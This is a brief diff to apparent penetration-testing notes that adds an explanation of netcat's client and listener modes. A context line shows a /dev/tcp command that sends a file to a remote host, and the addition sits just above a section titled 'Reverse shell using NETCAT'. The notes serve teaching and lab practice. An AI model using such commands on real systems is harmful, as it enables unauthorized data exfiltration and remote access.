@@ -42,6 +42,18 @@ cat file.txt > /dev/tcp/10.2.0.2/1111
 This method is useful for host that does not have NETCAT available.
 
 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Netcat operates in two primary modes:
+
+    Client - netcat initiates connections to another computer
+
+$ nc 10.2.0.2 1111
+
+    Listener - netcat listens for a connections inbound from another computer (a listener must always be established first)
+
+$ nc -l -p 2222
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
 
 Reverse shell using NETCAT
 
